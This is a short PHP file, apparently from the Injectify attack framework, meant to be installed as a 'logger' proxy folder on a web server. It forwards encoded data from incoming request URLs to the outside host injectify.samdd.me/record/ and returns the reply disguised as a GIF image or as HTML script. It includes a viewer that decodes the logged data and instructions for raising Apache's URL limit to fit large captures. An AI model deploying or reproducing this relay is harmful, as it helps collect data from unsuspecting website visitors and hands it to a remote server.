<?php
    //    _____        _           _   _  __       
    //    \_   \_ __  (_) ___  ___| |_(_)/ _|_   _ 
    //     / /\/ '_ \ | |/ _ \/ __| __| | |_| | | |
    //  /\/ /_ | | | || |  __/ (__| |_| |  _| |_| |
    //  \____/ |_| |_|/ |\___|\___|\__|_|_|  \__, |
    //         |__/  https://samdd.me   |___/ 
    /////////////////////////////////////////////////
    //
    // 1. Place this file as 'index.php' in an empty folder
    // 2. Get the url to the folder and generate a payload

    // EXAMPLE:
    //    /var/www/
    //        - logger/
    //             - index.php
    //    Proxy URL = https://mysite.com/logger/

    // ADVANCED:
    //    - To inspect the contents of the log, append '&view' to the request URL

    // INCREASE APACHE2 URL LIMITS:
    //    sudo nano /etc/apache2/apache2.conf
    //    add the line `LimitRequestLine 1000000` to the bottom
    //    {CTRL-X}  {Y}  {ENTER}
    //    sudo service apache2 restart
    $base64       = explode("/", $_SERVER['REQUEST_URI']);
    $base64       = $base64[count($base64) - 1];
    $injectifyURL = "https://injectify.samdd.me/record/" . $base64;
    $response    = file_get_contents($injectifyURL);

    if (substr($base64, -5) == '&view') {
        header("Content-type: application/json");
        $json = substr($base64, 0, -5);
        if (substr($json, -1) == '$') {
            $json = substr($json, 0, -1);
        }
        $json = json_encode(json_decode(urldecode(base64_decode(strrev($json)))), JSON_PRETTY_PRINT);
        if (json_decode($json)) {
            echo $json;
        } else {
            echo json_encode(array('error' => true, 'message' => 'Failed to decode base64 string to JSON'), JSON_PRETTY_PRINT);
        }
    } else {
        if (preg_match('/<script>/', $response)) {
            header("Content-type: text/html");
        } else {
            header("Content-type: image/gif");
        }
        echo $response;
    }
?>